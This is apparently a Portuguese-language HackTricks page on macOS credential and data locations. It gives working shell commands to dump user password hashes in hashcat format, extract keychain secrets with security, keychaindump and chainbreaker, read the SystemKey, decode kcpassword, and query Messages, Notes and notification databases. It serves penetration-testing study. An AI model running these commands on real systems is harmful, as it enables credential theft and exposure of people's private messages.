# macOS Sensitive Locations & Interesting Daemons

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Senhas

### Senhas Shadow

A senha shadow é armazenada com a configuração do usuário em plists localizadas em **`/var/db/dslocal/nodes/Default/users/`**.\
A seguinte linha de comando pode ser usada para despejar **todas as informações sobre os usuários** (incluindo informações de hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ou [**este**](https://github.com/octomagon/davegrohl.git) podem ser usados para transformar o hash para **formato** **hashcat**.

Uma alternativa de uma linha que irá despejar credenciais de todas as contas não de serviço no formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Dump do Keychain

Observe que ao usar o binário de segurança para **extrair as senhas descriptografadas**, vários prompts solicitarão ao usuário que permita essa operação.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Com base neste comentário [juuso/keychaindump#10 (comentário)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), parece que essas ferramentas não estão mais funcionando no Big Sur.
{% endhint %}

### Visão Geral do Keychaindump

Uma ferramenta chamada **keychaindump** foi desenvolvida para extrair senhas dos keychains do macOS, mas enfrenta limitações em versões mais recentes do macOS, como o Big Sur, conforme indicado em uma [discussão](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). O uso do **keychaindump** requer que o atacante ganhe acesso e eleve privilégios para **root**. A ferramenta explora o fato de que o keychain é desbloqueado por padrão ao fazer login do usuário por conveniência, permitindo que aplicativos acessem sem exigir repetidamente a senha do usuário. No entanto, se um usuário optar por bloquear seu keychain após cada uso, o **keychaindump** se torna ineficaz.

**Keychaindump** opera direcionando um processo específico chamado **securityd**, descrito pela Apple como um daemon para operações de autorização e criptografia, crucial para acessar o keychain. O processo de extração envolve identificar uma **Chave Mestra** derivada da senha de login do usuário. Esta chave é essencial para ler o arquivo do keychain. Para localizar a **Chave Mestra**, o **keychaindump** escaneia o heap de memória do **securityd** usando o comando `vmmap`, procurando por chaves potenciais em áreas sinalizadas como `MALLOC_TINY`. O seguinte comando é usado para inspecionar essas localizações de memória:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Após identificar chaves mestres potenciais, **keychaindump** procura nos heaps por um padrão específico (`0x0000000000000018`) que indica um candidato para a chave mestre. Passos adicionais, incluindo deobfuscação, são necessários para utilizar esta chave, conforme descrito no código-fonte do **keychaindump**. Analistas focando nesta área devem notar que os dados cruciais para descriptografar o chaveiro estão armazenados na memória do processo **securityd**. Um exemplo de comando para executar o **keychaindump** é:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) pode ser usado para extrair os seguintes tipos de informações de um keychain do OSX de maneira forense:

* Senha do keychain hashada, adequada para quebra com [hashcat](https://hashcat.net/hashcat/) ou [John the Ripper](https://www.openwall.com/john/)
* Senhas da Internet
* Senhas genéricas
* Chaves privadas
* Chaves públicas
* Certificados X509
* Notas seguras
* Senhas do Appleshare

Dada a senha de desbloqueio do keychain, uma chave mestra obtida usando [volafox](https://github.com/n0fate/volafox) ou [volatility](https://github.com/volatilityfoundation/volatility), ou um arquivo de desbloqueio como SystemKey, o Chainbreaker também fornecerá senhas em texto claro.

Sem um desses métodos de desbloqueio do Keychain, o Chainbreaker exibirá todas as outras informações disponíveis.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Extrair chaves do keychain (com senhas) usando SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extrair chaves do chaveiro (com senhas) quebrando o hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extrair chaves do chaveiro (com senhas) com despejo de memória**

[Siga estas etapas](../#dumping-memory-with-osxpmem) para realizar um **despejo de memória**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Extrair chaves do chaveiro (com senhas) usando a senha do usuário**

Se você souber a senha do usuário, pode usá-la para **extrair e descriptografar chaveiros que pertencem ao usuário**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

O arquivo **kcpassword** é um arquivo que contém a **senha de login do usuário**, mas apenas se o proprietário do sistema tiver **ativado o login automático**. Portanto, o usuário será automaticamente conectado sem ser solicitado a fornecer uma senha (o que não é muito seguro).

A senha é armazenada no arquivo **`/etc/kcpassword`** xored com a chave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se a senha do usuário for mais longa que a chave, a chave será reutilizada.\
Isso torna a senha bastante fácil de recuperar, por exemplo, usando scripts como [**este aqui**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informações Interessantes em Bancos de Dados

### Mensagens
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificações

Você pode encontrar os dados de Notificações em `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

A maior parte das informações interessantes estará em **blob**. Portanto, você precisará **extrair** esse conteúdo e **transformá-lo** em **legível** **por humanos** ou usar **`strings`**. Para acessá-lo, você pode fazer: 

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notas

As **notas** dos usuários podem ser encontradas em `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Preferências

Em aplicativos macOS, as preferências estão localizadas em **`$HOME/Library/Preferences`** e no iOS estão em `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;

No macOS, a ferramenta de linha de comando **`defaults`** pode ser usada para **modificar o arquivo de Preferências**.

**`/usr/sbin/cfprefsd`** reivindica os serviços XPC `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e pode ser chamado para realizar ações como modificar preferências.

## Notificações do Sistema

### Notificações Darwin

O principal daemon para notificações é **`/usr/sbin/notifyd`**. Para receber notificações, os clientes devem se registrar através da porta Mach `com.apple.system.notification_center` (verifique-os com `sudo lsmp -p <pid notifyd>`). O daemon é configurável com o arquivo `/etc/notify.conf`.

Os nomes usados para notificações são notações DNS reversas únicas e, quando uma notificação é enviada a um deles, o(s) cliente(s) que indicaram que podem lidar com isso a receberão.

É possível despejar o status atual (e ver todos os nomes) enviando o sinal SIGUSR2 para o processo notifyd e lendo o arquivo gerado: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

O **Distributed Notification Center** cujo binário principal é **`/usr/sbin/distnoted`**, é outra maneira de enviar notificações. Ele expõe alguns serviços XPC e realiza algumas verificações para tentar verificar os clientes.

### Apple Push Notifications (APN)

Neste caso, os aplicativos podem se registrar para **tópicos**. O cliente gerará um token contatando os servidores da Apple através do **`apsd`**.\
Então, os provedores também terão gerado um token e poderão se conectar aos servidores da Apple para enviar mensagens aos clientes. Essas mensagens serão recebidas localmente pelo **`apsd`** que retransmitirá a notificação para o aplicativo que a aguarda.

As preferências estão localizadas em `/Library/Preferences/com.apple.apsd.plist`.

Há um banco de dados local de mensagens localizado no macOS em `/Library/Application\ Support/ApplePushService/aps.db` e no iOS em `/var/mobile/Library/ApplePushService`. Ele possui 3 tabelas: `incoming_messages`, `outgoing_messages` e `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Também é possível obter informações sobre o daemon e as conexões usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

Estas são notificações que o usuário deve ver na tela:

* **`CFUserNotification`**: Esta API fornece uma maneira de mostrar na tela um pop-up com uma mensagem.
* **O Quadro de Avisos**: Isso mostra no iOS um banner que desaparece e será armazenado no Centro de Notificações.
* **`NSUserNotificationCenter`**: Este é o quadro de avisos do iOS no MacOS. O banco de dados com as notificações está localizado em `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
